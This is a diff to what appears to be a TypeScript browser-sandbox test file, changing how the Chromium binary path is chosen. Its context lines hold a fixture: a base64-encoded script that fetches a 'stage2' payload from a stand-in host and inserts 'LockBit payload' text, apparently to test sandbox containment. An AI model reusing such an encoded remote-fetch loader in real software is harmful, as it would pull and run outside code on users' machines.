@@ -1,4 +1,5 @@
 import assert from 'node:assert/strict'
+import { existsSync } from 'node:fs'
 import http from 'node:http'
 import type { AddressInfo } from 'node:net'
 import WebSocket, { WebSocketServer } from 'ws'
@@ -47,7 +48,8 @@ type BrokerPayload = {
 }
 
 process.env.BROWSER_SANDBOX_ALLOW_LOCAL_TARGETS = '1'
-process.env.CHROMIUM_BIN ||= chromium.executablePath()
+const playwrightChromium = chromium.executablePath()
+if (!process.env.CHROMIUM_BIN && existsSync(playwrightChromium)) process.env.CHROMIUM_BIN = playwrightChromium
 
 const payloadDomain = 'payload.example.test'
 const encoded = Buffer.from(`fetch("https://${payloadDomain}/stage2"); document.body.insertAdjacentHTML("beforeend", "<p>LockBit payload</p>");`).toString('base64')
